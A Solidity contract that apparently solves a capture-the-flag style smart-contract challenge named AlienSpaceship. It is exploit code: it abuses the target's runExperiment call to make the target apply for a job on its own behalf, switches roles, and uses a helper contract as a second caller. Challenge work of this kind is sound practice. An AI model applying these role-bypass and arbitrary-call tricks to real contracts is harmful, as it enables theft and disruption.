// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./AlienSpaceship_recovered.sol";

contract AlienSpaceshipAttack {
    AlienSpaceship public alienSpaceship;
    
    constructor(AlienSpaceship a) {
        alienSpaceship = a;   
        dumpPayloadMass();  // ENGINEER
        becomePhysicist();  // PHYSICIST  
    }
    

    function dumpPayloadMass() internal {
        alienSpaceship.applyForJob(alienSpaceship.ENGINEER());
        alienSpaceship.dumpPayload(4100 *10**18);
        // ENGINEER
    }

    function becomePhysicist() internal {
        bytes memory data = abi.encodeWithSelector(AlienSpaceship.applyForJob.selector, alienSpaceship.ENGINEER());
        alienSpaceship.runExperiment(data);
        alienSpaceship.quitJob();
        alienSpaceship.applyForJob(alienSpaceship.PHYSICIST());
        alienSpaceship.enableWormholes();
    }

    function becomeCaptain() public {
        alienSpaceship.applyForPromotion(alienSpaceship.CAPTAIN());
    }

    function visitArea51(uint160 password) public {
        alienSpaceship.visitArea51(address(password));
    }

    function jumpThroughWormhole(uint256 x, uint256 y, uint256 z) public {
        alienSpaceship.jumpThroughWormhole(x, y, z);
    }

    function dumpPayloadAgain() public {
        Helper h = new Helper(alienSpaceship);
    }

    function abortMission() public {
        alienSpaceship.abortMission();
    }

}

contract Helper {
    constructor(AlienSpaceship a) {
        a.applyForJob(a.ENGINEER());
        a.dumpPayload(1000 *10**18);
    }
}
